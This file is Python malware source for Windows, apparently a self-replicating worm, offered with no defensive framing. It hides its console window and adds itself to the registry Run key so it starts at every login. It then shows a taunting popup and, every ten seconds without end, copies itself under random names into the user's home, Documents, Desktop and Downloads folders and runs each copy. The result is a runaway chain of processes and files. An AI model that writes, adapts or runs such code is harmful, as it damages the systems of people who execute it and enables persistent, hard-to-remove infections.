import os
import random
import sys
import time
import uuid
import ctypes
import winreg as reg
import glob

def get_self_executable():
    """Retrieve the path to the current executable."""
    return os.path.abspath(sys.argv[0])

def create_unique_file(base_dir):
    """Copy the current executable to a new unique file."""
    unique_filename = f"{uuid.uuid4()}.exe" if sys.argv[0].endswith('.exe') else f"{uuid.uuid4()}.py"
    file_path = os.path.join(base_dir, unique_filename)
    with open(file_path, "wb") as f:
        with open(get_self_executable(), "rb") as exe:
            f.write(exe.read())
    return file_path

def move_file_randomly(file_path):
    """Move the file to a randomly chosen directory."""
    base_dirs = [
        os.path.expanduser("~"),  # User home directory
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Downloads"),    ]
    new_base_dir = random.choice(base_dirs)
    new_file_path = os.path.join(new_base_dir, os.path.basename(file_path))
    os.rename(file_path, new_file_path)
    return new_file_path

def execute_file(file_path):
    """Make the file executable and execute it."""
    os.chmod(file_path, 0o755)  # Make the file executable
    os.system(f"python {file_path}")

def show_popup():
    """Display a popup message."""
    ctypes.windll.user32.MessageBoxW(
        None,
        "MY MASTER TOLD ME TO UwU\nWANNA KNOW WHO HE IS?\nSURE\n:D\n\nETB(A)",
        "I'M ARRRAKIS: CATCH ME IF YOU CAN",
        0
    )

def hide_console():
    """Hides the console window."""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup():
    """Add the application to Windows startup."""
    exe_path = get_self_executable()
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
        reg.SetValueEx(reg_key, "MyApp", 0, reg.REG_SZ, exe_path)
    print(f"Added {exe_path} to startup.")

def replicate():
    """Replicate the script by creating and executing new copies."""
    base_dirs = [
        os.path.expanduser("~"),  # User home directory
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
    ]

    while True:
        time.sleep(10)  # Wait 10 seconds before replication
        base_dir = random.choice(base_dirs)  # Randomly select a base directory
        file_path = create_unique_file(base_dir)  # Create a replica
        new_file_path = move_file_randomly(file_path)  # Move the file randomly
        execute_file(new_file_path)  # Execute the replica

if __name__ == "__main__":
    hide_console()  # Hide the console window
    add_to_startup()  # Add to Windows startup
    show_popup()  # Show the popup message
    replicate()
